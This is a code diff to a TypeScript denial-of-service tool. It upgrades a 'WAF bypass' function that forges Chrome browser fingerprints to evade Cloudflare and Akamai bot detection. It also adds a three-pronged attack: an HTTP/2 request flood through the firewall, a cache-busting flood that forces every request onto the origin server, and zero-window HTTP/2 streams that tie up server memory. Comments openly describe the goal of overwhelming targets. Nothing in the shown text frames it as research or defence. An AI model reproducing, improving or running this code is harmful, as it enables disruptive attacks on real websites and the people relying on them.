@@ -960,14 +960,18 @@ function randomJA3Ciphers(): string {
   return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
 }
 
-// Chrome browser profiles — realistic, matching versions
+// Chrome browser profiles — Chrome 130-134 (current as of April 2026)
 const CHROME_PROFILES = [
-  { ver: "124", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",      plat: '"Windows"', brand: '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"' },
-  { ver: "125", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",      plat: '"Windows"', brand: '"Google Chrome";v="125", "Chromium";v="125", "Not-A.Brand";v="24"' },
-  { ver: "124", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"' },
-  { ver: "125", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="125", "Chromium";v="125", "Not-A.Brand";v="24"' },
-  { ver: "123", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="123", "Chromium";v="123", "Not-A.Brand";v="24"' },
-  { ver: "126", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="126", "Chromium";v="126", "Not-A.Brand";v="24"' },
+  { ver: "130", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"', mobile: false },
+  { ver: "131", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "132", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="132", "Chromium";v="132", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "133", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "134", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "134", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
+  { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true  },
+  { ver: "134", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6478.35 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: true  },
 ];
 
 // Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
@@ -981,18 +985,23 @@ const CHROME_H2_SETTINGS = {
 };
 
 // Chrome-exact header order for HTTP/2 (AKAMAI checks header order)
-// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome
-function buildWAFHeaders(hostname: string, path: string, cookieJar: Map<string, string>): Record<string, string> {
-  const p = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome exactly
+function buildWAFHeaders(
+  hostname:  string,
+  path:      string,
+  cookieJar: Map<string, string>,
+  profile?:  typeof CHROME_PROFILES[0],
+): Record<string, string> {
+  const p = profile ?? CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
 
   // Realistic CF cookies — Cloudflare sets these via JS challenge
-  const cfbm      = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
-  const cfruid    = randHex(40);
-  const cfClear   = `${randHex(100)}_${randInt(1,9)}`;
-  const gaId      = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
-  const gid       = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;
+  const cfbm    = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
+  const cfruid  = randHex(40);
+  const cfClear = `${randHex(100)}_${randInt(1,9)}`;
+  const gaId    = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
+  const gid     = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;
 
-  // Carry over any server-set cookies from cookie jar
+  // Carry over any server-set cookies from the per-session cookie jar
   const jarCookies = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");
 
   const cookie = [
@@ -1005,14 +1014,18 @@ function buildWAFHeaders(hostname: string, path: string, cookieJar: Map<string, 
     jarCookies,
   ].filter(Boolean).join("; ");
 
+  // Direct navigation is most common for repeat visitors; search engines occasionally
   const referers = [
     `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
     `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
-    "",  // direct navigation (most common)
-    "",
-    "",
+    `https://www.google.com/`,
+    "", "", "", "", "",  // direct navigation — most common
   ];
   const referer = referers[randInt(0, referers.length)];
+
+  // sec-fetch-user: ?1 is ONLY sent by Chrome on top-level user-initiated navigations.
+  // Sending it on every request is a well-known bot fingerprint.
+  const isUserInitiated = Math.random() < 0.42;
 
   // EXACT Chrome header order for HTTP/2 — this is the AKAMAI fingerprint
   const h: Record<string, string> = {
@@ -1022,20 +1035,21 @@ function buildWAFHeaders(hostname: string, path: string, cookieJar: Map<string, 
     ":scheme":    "https",
     ":path":      path,
     // Real headers in Chrome's EXACT order
-    "sec-ch-ua":            p.brand,
-    "sec-ch-ua-mobile":     "?0",
-    "sec-ch-ua-platform":   p.plat,
-    "upgrade-insecure-requests": "1",
-    "user-agent":           p.ua,
-    "accept":               "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "sec-fetch-site":       referer ? "cross-site" : "none",
-    "sec-fetch-mode":       "navigate",
-    "sec-fetch-user":       "?1",
-    "sec-fetch-dest":       "document",
-    "accept-encoding":      "gzip, deflate, br, zstd",
-    "accept-language":      ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8"][randInt(0,3)],
-    "cookie":               cookie,
-    "cache-control":        "max-age=0",
+    "sec-ch-ua":                  p.brand,
+    "sec-ch-ua-mobile":           p.mobile ? "?1" : "?0",  // tied to actual UA type
+    "sec-ch-ua-platform":         p.plat,
+    "upgrade-insecure-requests":  "1",
+    "user-agent":                 p.ua,
+    "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "sec-fetch-site":             referer ? "cross-site" : "none",
+    "sec-fetch-mode":             "navigate",
+    ...(isUserInitiated ? { "sec-fetch-user": "?1" } : {}),
+    "sec-fetch-dest":             "document",
+    "accept-encoding":            "gzip, deflate, br, zstd",
+    "accept-language":            ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][randInt(0,4)],
+    "cookie":                     cookie,
+    "cache-control":              "max-age=0",
+    "priority":                   "u=0, i",  // Chrome 124+: document navigation priority signal
   };
   if (referer) h["referer"] = referer;
   return h;
@@ -1065,26 +1079,32 @@ async function runWAFBypass(
     catch { return new URL("https://127.0.0.1"); }
   })();
   const hostname   = u.hostname;
-  const tgtPort    = 443; // WAF bypass always targets HTTPS
   const resolvedIp = await resolveHost(hostname).catch(() => hostname);
-  const target     = `https://${resolvedIp}:${tgtPort}`;
+  const target     = `https://${resolvedIp}:443`;
 
-  // 32GB RAM optimized: 5× more sessions (400 vs 80), 2× concurrent streams (128 vs 64)
-  // 400 Chrome-fingerprinted sessions × 128 streams = 51,200 concurrent fake browsers
-  const NUM_SESSIONS     = Math.min(threads * 2, 400);
-  const STREAMS_PER      = Math.min(128, Math.max(16, threads));
+  // ── Thread budget — 3-vector split (mirrors Geass Override philosophy) ───
+  // Layer A (60%): Primary Chrome-fingerprinted H2 flood — max RPS through WAF
+  // Layer B (25%): Cache-bust flood — unique keys force 100% origin misses on CDN
+  // Layer C (15%): H2 stream drain — zero window-size holds server RAM buffers
+  const primaryT = Math.max(1, Math.floor(threads * 0.60));
+  const cacheT   = Math.max(1, Math.floor(threads * 0.25));
+  const drainT   = Math.max(1, threads - primaryT - Math.floor(threads * 0.25));
+
+  const NUM_PRIMARY = Math.min(primaryT * 2, 400);
+  const NUM_CACHE   = Math.min(cacheT   * 3, 300);
+  const NUM_DRAIN   = Math.min(drainT   * 2, 150);
+  const STREAMS_PER = Math.min(128, Math.max(16, primaryT));
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // Cookie jar shared across sessions for same hostname (simulates persistent browser)
-  const cookieJar = new Map<string, string>();
-
-  // ── Persistent session slot — restarts until signal aborted ────────────
-  // Same fix as H2 flood: while-loop prevents premature Promise.all resolution
-  // when CF temporarily rejects new connections.
-  const runSessionSlot = async (): Promise<void> => {
+  // ── Layer A: Primary Chrome-fingerprinted H2 flood ────────────────────
+  // Each slot gets its own profile + cookie jar — simulates an independent browser session.
+  // Per-session jar is critical: real browsers never share cookies across tabs/windows.
+  const runPrimarySlot = async (): Promise<void> => {
+    const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const cookieJar      = new Map<string, string>(); // isolated per "browser"
     while (!signal.aborted) {
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
@@ -1098,18 +1118,18 @@ async function runWAFBypass(
           });
         } catch { resolve(); return; }
 
-        const conn     = c;
-        const cleanup  = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
-        let inflight   = 0;
+        const conn    = c;
+        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        let inflight  = 0;
 
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
           while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
             inflight++;
             const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
-            const path = pagePath + (Math.random() < 0.3 ? `?v=${randInt(1,999)}` : "");
+            const path     = pagePath + (Math.random() < 0.5 ? `?v=${randInt(1,9999)}` : "");
             try {
-              const hdrs   = buildWAFHeaders(hostname, path, cookieJar);
+              const hdrs   = buildWAFHeaders(hostname, path, cookieJar, sessionProfile);
               const stream = conn.request(hdrs);
               stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                 localPkts++; localBytes += 2048;
@@ -1132,15 +1152,118 @@ async function runWAFBypass(
         };
 
         conn.on("connect", () => { pump(); });
-        conn.on("error",   () => { resolve(); }); // restarts in next while iteration
-        conn.on("close",   () => { resolve(); }); // restarts in next while iteration
+        conn.on("error",   () => { resolve(); });
+        conn.on("close",   () => { resolve(); });
         signal.addEventListener("abort", cleanup, { once: true });
       });
-      if (!signal.aborted) await new Promise(r => setTimeout(r, 200 + randInt(0, 150)));
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(150, 500)));
     }
   };
 
-  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
+  // ── Layer B: Cache-bust with Chrome headers — forces 100% CDN origin misses ──
+  // Every request has a unique cache key so the CDN cannot serve a cached response.
+  // All requests pass through WAF (Chrome-fingerprinted headers) and then hit origin.
+  // Origin load compounds with Layer A flood traffic.
+  const runCacheBustSlot = async (): Promise<void> => {
+    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const cookieJar = new Map<string, string>();
+    while (!signal.aborted) {
+      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
+      const bust     = `?_=${randStr(12)}&v=${randInt(1, 999999999)}&t=${Date.now()}`;
+      const fullPath = pagePath + bust;
+      const url      = `https://${hostname}${fullPath}`;
+      try {
+        const ac = new AbortController();
+        const t  = setTimeout(() => ac.abort(), 6_000);
+        signal.addEventListener("abort", () => ac.abort(), { once: true });
+        const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
+        const fetchHdrs: Record<string, string> = {};
+        for (const [k, v] of Object.entries(wafHdrs)) {
+          if (!k.startsWith(":")) fetchHdrs[k] = v; // strip H2 pseudo-headers for fetch
+        }
+        const res = await fetch(url, {
+          method:  "GET",
+          signal:  ac.signal,
+          headers: { ...fetchHdrs, "cache-control": "no-store, no-cache", "pragma": "no-cache" },
+        });
+        clearTimeout(t);
+        const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
+        localPkts++; localBytes += body.byteLength || 512;
+        const setCookie = res.headers.get("set-cookie");
+        if (setCookie) {
+          const [kv] = setCookie.split(";");
+          const [k, v] = kv.split("=");
+          if (k && v) cookieJar.set(k.trim(), v.trim());
+        }
+      } catch { /* absorb, keep looping */ }
+    }
+  };
+
+  // ── Layer C: H2 stream drain — zero receive window holds server RAM buffers ──
+  // Opens H2 sessions with initialWindowSize=0 so the server cannot send any data.
+  // Server allocates a response buffer per stream and holds it until the client opens
+  // the window — which never happens. 32 × 150 sessions = 4,800 frozen buffers.
+  const runDrainSlot = async (): Promise<void> => {
+    const cookieJar = new Map<string, string>();
+    while (!signal.aborted) {
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
+        try {
+          c = h2connect(target, {
+            rejectUnauthorized: false,
+            servername:         hostname,
+            ciphers:            randomJA3Ciphers(),
+            settings: {
+              ...CHROME_H2_SETTINGS,
+              initialWindowSize: 0, // zero window → server buffers response forever
+            },
+            ALPNProtocols: ["h2", "http/1.1"],
+          });
+        } catch { resolve(); return; }
+
+        const conn    = c;
+        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        const MAX_DRAIN = 32;
+        let   opened    = 0;
+
+        const openDrainStream = () => {
+          if (signal.aborted || conn.destroyed || opened >= MAX_DRAIN) return;
+          opened++;
+          const path = WAF_PATHS[randInt(0, WAF_PATHS.length)];
+          try {
+            const hdrs   = buildWAFHeaders(hostname, path, cookieJar);
+            const stream = conn.request(hdrs);
+            stream.pause(); // never read — server cannot flush, buffer stays allocated
+            stream.on("response", () => { localPkts++; localBytes += 512; });
+            stream.on("error",    () => { opened = Math.max(0, opened - 1); });
+            // Hold each stream 20–60s before closing — prolonged RAM hold on server
+            setTimeout(() => {
+              try { stream.close(); } catch { /**/ }
+              opened = Math.max(0, opened - 1);
+              if (!signal.aborted && !conn.destroyed) openDrainStream();
+            }, randInt(20_000, 60_000));
+          } catch { opened = Math.max(0, opened - 1); }
+        };
+
+        conn.on("connect", () => {
+          for (let i = 0; i < MAX_DRAIN; i++) setTimeout(() => openDrainStream(), i * 50);
+        });
+        conn.on("error", () => { resolve(); });
+        conn.on("close", () => { resolve(); });
+        // Session lives 60–120s then reconnects (avoids idle timeouts)
+        setTimeout(() => cleanup(), randInt(60_000, 120_000));
+        signal.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(500, 1500)));
+    }
+  };
+
+  await Promise.all([
+    ...Array.from({ length: NUM_PRIMARY }, () => runPrimarySlot()),
+    ...Array.from({ length: NUM_CACHE   }, () => runCacheBustSlot()),
+    ...Array.from({ length: NUM_DRAIN   }, () => runDrainSlot()),
+  ]);
+
   clearInterval(flushIv);
   flush();
 }
